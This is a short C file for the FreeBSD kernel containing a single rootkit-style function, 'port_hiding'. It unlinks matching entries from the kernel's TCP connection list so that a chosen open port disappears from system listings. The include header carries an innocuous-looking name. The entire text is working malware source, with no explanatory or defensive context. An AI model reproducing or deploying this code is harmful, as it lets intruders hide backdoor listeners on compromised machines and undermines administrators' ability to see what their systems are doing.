#include "electronics_kit.h"

int port_hiding(u_int16_t lport) {
	struct inpcb *inpb;

	INP_INFO_WLOCK(&tcbinfo);

	/* Iterate through the TCP-based inpcb list. */
	LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {
		if (inpb->inp_vflag & INP_TIMEWAIT)
			continue;

		INP_LOCK(inpb);

		/* Do we want to hide this local open port? */
		if (lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
			LIST_REMOVE(inpb, inp_list);

		INP_UNLOCK(inpb);
	}

	INP_INFO_WUNLOCK(&tcbinfo);

	return(0);
}
